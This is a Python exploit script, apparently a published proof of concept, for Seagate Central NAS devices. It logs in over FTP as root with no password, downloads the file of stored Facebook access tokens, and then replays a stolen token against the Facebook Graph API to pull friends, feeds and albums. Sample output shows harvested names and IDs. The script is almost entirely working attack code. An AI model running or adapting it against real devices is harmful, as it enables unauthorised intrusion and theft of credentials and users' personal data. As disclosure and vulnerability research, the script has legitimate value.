# seagate_central_facebook.py
#
# Seagate Central Remote Facebook Access Token Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# May 2015
#
# -Synopsis-
#
# Seagate Central stores linked Facebook account access tokens in /etc/archive_accounts.ser
# and this exploit takes advantage of two bugs:
#
# 1) Passwordless root login via FTP to retrieve archive_accounts.ser file which contains access tokens
# 2) Reuses the unencrypted and unprotected (-rw-r--r--) access tokens for a chosen scope to return data
#
# -Example-
#
# > seagate_fb_accounts.py getaccesstoken 1.2.3.4
#
# &#039;archive_accounts.ser&#039;
#
# a:1:{s:8:"facebook";a:1:{s:29:"user3535@facebook.com";a:5:{s:7:"service";s:8:"facebook";s:4:
# "user";s:29:"user3535@facebook.com";s:5:"owner";s:4:"test";s:6:"folder";s:7:"private";s:5:"t
# oken";s:186:"CAAxxxxxxxx..."
# ;}}}
#
# Next, try this:
#
# > seagate_fb_accounts.py CAAxxxxxxxx... friends
# server response:
#
# {&#039;data&#039;: [{&#039;name&#039;: &#039;Jessie Taylor&#039;, &#039;id&#039;: &#039;100000937485968&#039;}, {&#039;name&#039;: &#039;Kellie Youty&#039;, &#039;id&#039;: &#039;1
# 00000359801427&#039;}, {&#039;name&#039;: &#039;Hope Maynard&#039;, &#039;id&#039;: &#039;10000102938470&#039;}, {&#039;name&#039;: &#039;Angel Tucker Pole&#039;, &#039;id&#039;
# : &#039;100001402808867&#039;}, {&#039;name&#039;: &#039;Malcolm Vance&#039;, &#039;id&#039;: &#039;10000284629187&#039;}, {&#039;name&#039;: &#039;Tucker Civile&#039;, &#039;id&#039;:
# .....
#
# Scopes Reference: https://developers.facebook.com/docs/graph-api/reference/v2.1/user
#
# -Fixes-
#
# Seagate scheduled updates to go live on April 28th, 2015.
#
# Tested version: 2014.0410.0026-F
#
 
import sys
import json
from urllib import request # python3
from ftplib import FTP
 
fb_url = "https://graph.facebook.com"
fb_filename = "archive_accounts.ser"
 
def getaccesstoken(host):
    try:
        ftp = FTP(host)
        ftp.login("root")
        ftp.retrbinary("RETR " + "/etc/" + fb_filename, open(fb_filename, &#039;wb&#039;).write)
        ftp.close()
     
    except Exception as error:
        print("Error: %s" % error)
        return
 
    try:
        with open(fb_filename, &#039;r&#039;) as file:
            data = file.read()
 
    except Exception as error:
        print("Error: %s" % error)
        return
 
    print("\n&#039;%s&#039;\n\n%s\n\n" % (fb_filename, data))
 
    return
 
def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <key> <scope> OR getaccesstoken <host>\n" % sys.argv[0])
        print("scopes: albums feed friends likes picture posts television")
        return
 
    if(sys.argv[1] == "getaccesstoken"):
        if(len(sys.argv) == 3):
            host = sys.argv[2]
 
            res = getaccesstoken(host)
         
        else:
            print("Error: need host to retrieve access token file\n")
            return
 
    else:
        key = sys.argv[1]
     
        if(len(sys.argv) == 3):
            scope = sys.argv[2]
        else:
            scope = ""
 
        try:
            response = request.urlopen(fb_url + "/me/" + scope + "?access_token=" + key).read()
 
        except Exception as error:
            print("Error: %s" % error)
            return
 
        data = json.loads(response.decode(&#039;utf-8&#039;))
 
        print("server response:\n\n%s\n" % data)
 
    return
 
if __name__ == "__main__":
    main()

